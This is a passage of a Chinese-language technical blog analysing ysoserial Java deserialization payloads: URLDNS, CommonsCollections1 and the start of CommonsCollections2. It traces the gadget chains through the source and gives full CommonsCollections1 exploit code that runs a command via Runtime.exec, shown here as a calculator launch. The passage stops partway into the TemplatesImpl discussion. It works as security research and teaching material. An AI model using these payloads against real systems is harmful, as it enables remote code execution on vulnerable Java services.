<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里同样做了防本地与目标机dns请求混淆，不过这个方法更有趣些</p>
<p>这里通过子类重写了URLStreamHandler的getHostAddress方法，使其调用时放回null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以当handler.hashCode调用getHostAddress时实际调用的重写后的getHostAddress,返回了null，所以本机上并不会发送dns请求，<strong>又因为handler是transient类型，所以我们自己重写的handler并不会生效</strong>，在反序列化时实际调用的还是本来的URLStreamHandler，同样可规避本机dns请求与目标机dns请求的混淆。</p>
<h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><h4 id="Gadget-Chain-1"><a href="#Gadget-Chain-1" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br></pre></td></tr></table></figure>



<p>主要分析部分为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">	Map(Proxy).entrySet()</span><br><span class="line">		AnnotationInvocationHandler.invoke()</span><br><span class="line">			LazyMap.get()</span><br></pre></td></tr></table></figure>

<p>后面触发RCE过程前面文章有分析过，就不赘述了。</p>
<p>首先跟进LazyMap类的get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑为如果在map中不存在get函数中的参数key，直接调用this.factory.transform，这里的transform就符合了我们需要的rce的点了</p>
<p>我们可以直接把factory赋值为ChaindedTransformer去触发就可以了</p>
<p><img src="https://s1.ax1x.com/2020/07/09/UmBY6O.png" alt="UmBY6O.png"></p>
<p>跟进下如何给factory进行赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过decorate函数传入Map和一个Transformerl类型的factory，然后调用LazyMap的构造函数把ChaindedTransformer赋值给this.factory，最终在LazyMap的get方法中进行transformer函数调用完成RCE。</p>
<p>所以接下来该寻找的就是如何去触发LazyMap.get这个函数了</p>
<p>ysoserial的作者在jdk的内置类中找到了AnnotationInvocationHandler这个类，跟进invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">       String var4 = var2.getName();</span><br><span class="line">       Class[] var5 = var2.getParameterTypes();</span><br><span class="line">       <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">........	</span><br><span class="line"></span><br><span class="line">           <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">               <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">               &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                       var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">return</span> var6;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>把重点代码单拿出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br></pre></td></tr></table></figure>

<p>如果在this.memberValues变量可被赋值为LazyMap，那么就可以触发后面的一切RCE链，跟进一下memberValues的赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = var1;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在var1为注释类的情况下，可将memberValues变量赋值为var2，我们可通过如下代码进行LazyMap的传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>并且AnnotationInvocationHandler是InvocationHandler的子类，实现了InvocationHandler中的invoke方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public interface InvocationHandler &#123;</span><br><span class="line"></span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args)</span><br><span class="line">        throws Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这其实是一个动态代理，我们可以先声明一个动态代理对象传给AnnotationInvocationHandler，当此对象调用任意的方法，都会先调用动态代理类的invoke方法，而我们将动态代理类中的memberValues变量设置为LazyMap的话，最终就实现了LazyMap.get的调用。</p>
<p>动态代理部分代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, chain);</span><br><span class="line"><span class="comment">//AnnotationInvocationHandler的构造方法非public 所以需要通过反射进行调用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler testInvocationHandler = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Object testMap = Proxy.newProxyInstance(</span><br><span class="line">    testInvocationHandler.getClass().getClassLoader(),</span><br><span class="line">    <span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line"><span class="class">    <span class="title">testInvocationHandler</span></span></span><br><span class="line"><span class="class">)</span>;</span><br><span class="line"></span><br><span class="line">InvocationHandler Invoation1 = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">testMap</span>)</span>;</span><br><span class="line"><span class="keyword">return</span> Invoation1;</span><br></pre></td></tr></table></figure>

<p>最后在readObject方法中触发</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes();</span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next();</span><br><span class="line">        String var6 = (String)var5.getKey();</span><br><span class="line">        Class var7 = (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object var8 = var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在readObject中memberValues调用entrySet方法，触发invoke，进而触发LazyMap.get实现RCE</p>
<p>最后简述下最后的调用链</p>
<ul>
<li>反序列化readObject方法触发memberValues.entrySet</li>
<li>进一步触发invoke方法及invoke中的get函数</li>
<li>触发lazyMap.get和get函数中的transform完成RCE</li>
</ul>
<h4 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aopalliance.intercept.Invocation;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testCommonsCollections1</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">            new InvokerTransformer("getMethod", new Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            new InvokerTransformer("invoke", new Class[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new Object[]&#123;"open -a Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, chain);</span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler的构造方法非public 所以需要通过反射进行调用</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler testInvocationHandler = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Object testMap = Proxy.newProxyInstance(</span><br><span class="line">            testInvocationHandler.getClass().getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line"><span class="class">            <span class="title">testInvocationHandler</span></span></span><br><span class="line"><span class="class">        )</span>;</span><br><span class="line"></span><br><span class="line">        InvocationHandler Invoation1 = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">testMap</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> Invoation1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大概简述下最后的调用链</p>
<h4 id="Effect"><a href="#Effect" class="headerlink" title="Effect"></a>Effect</h4><p><img src="https://s1.ax1x.com/2020/07/09/Um5KFf.png" alt="Um5KFf.png"></p>
<h3 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h3><h4 id="Gadget-Chain-2"><a href="#Gadget-Chain-2" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		PriorityQueue.readObject()</span><br><span class="line">			...</span><br><span class="line">				TransformingComparator.compare()</span><br><span class="line">					InvokerTransformer.transform()</span><br><span class="line">						Method.invoke()</span><br><span class="line">							Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>跟进分析</p>
<p>跟进PriorityQueue类中readObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in "proper order", but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到queue[i]=s.readObject也就是queue的值是由我们控制的，我们可以在前面通过writeObject进行写入</p>
<p>接着跟进heapify函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进siftDown</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">        siftDownUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会进行一个判断如何comparator不为null则进入siftDownUsingComparator函数，如果没有就进入siftDownComparable函数，同样，我们可控的值为x</p>
<p>看一下comparator的赋值逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                     Comparator&lt;? <span class="keyword">super</span> E&gt; comparator)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">    <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">    <span class="keyword">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出这里是在实例化的时候直接进行赋值</p>
<p>接着跟进siftDownUsingComparator函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这行代码中出现了我们可控的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>跟进compare函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(I obj1, I obj2)</span> </span>&#123;</span><br><span class="line">    O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transformer赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.decorated = decorated;</span><br><span class="line">    <span class="keyword">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>出现了熟悉的transform函数，并且this.transformer可控，意味着我们可以执行任意类的任意方法了。</p>
<p>不过在ysoserial中的commonscollection2中对于transformer的调用并非采用的是ChainedTransformer的transform进行循环调用产生RCE，而是用了一个新的有趣的攻击手法：<strong>TemplatesImpl</strong>类</p>
<p>跟进Templateslmpl类中newTransformer函数</p>
